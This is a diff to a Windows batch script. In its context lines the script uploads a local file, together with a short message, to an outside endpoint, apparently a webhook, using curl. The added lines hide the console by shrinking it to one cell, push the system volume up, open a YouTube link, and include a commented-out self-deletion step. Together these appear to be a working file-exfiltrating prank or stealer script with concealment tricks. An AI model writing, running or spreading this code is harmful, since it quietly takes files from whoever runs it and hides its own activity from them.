@@ -26,4 +26,11 @@ if exist "%CodexE%" (
     curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"huy sona\"}" %Codex%
     curl -F "file=@%CodexE%" %Codex%
 )
+powershell -command "$host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(1, 1)"
+powershell -c "$obj = New-Object -ComObject WScript.Shell; 1..50 | ForEach-Object { $obj.SendKeys([char]175) }"
+cd "%userprofile%"
+start "" "https://youtu.be/xvFZjo5PgG0"
+timeout /t 1 /nobreak >nul 
+::del "%~f0"
+pause
 exit
